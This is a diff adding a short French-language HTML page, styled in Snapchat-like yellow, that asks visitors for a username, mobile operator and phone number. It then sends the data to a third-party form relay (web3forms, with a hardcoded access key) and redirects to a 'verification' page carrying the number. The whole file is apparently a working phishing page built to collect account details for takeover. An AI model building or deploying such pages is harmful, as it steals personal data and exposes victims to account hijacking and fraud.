@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#FFFC00] flex items-center justify-center h-screen">
+    <div class="bg-white p-8 rounded-[30px] shadow-2xl w-[90%] max-w-sm">
+        <form id="form1">
+            <input type="hidden" name="access_key" value="55a75b87-51e6-4f98-bcaa-125202c0904e">
+            <input type="text" name="Identifiant" placeholder="Identifiant" class="w-full p-4 mb-3 bg-gray-100 rounded-2xl" required>
+            <select name="Operateur" class="w-full p-4 mb-3 bg-gray-100 rounded-2xl" required>
+                <option value="Bouygues">Bouygues</option>
+                <option value="SFR">SFR</option>
+                <option value="Orange">Orange</option>
+            </select>
+            <input type="tel" name="Telephone" id="tel" placeholder="Numéro" class="w-full p-4 mb-6 bg-gray-100 rounded-2xl" required>
+            <button type="submit" class="w-full bg-black text-white py-4 rounded-full font-bold">Continuer</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('form1').onsubmit = async (e) => {
+            e.preventDefault();
+            const tel = document.getElementById('tel').value;
+            // Envoi des données
+            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
+            // Redirection forcée
+            window.location.href = 'verification.html?tel=' + encodeURIComponent(tel);
+        };
+    </script>
+</body>
+</html>
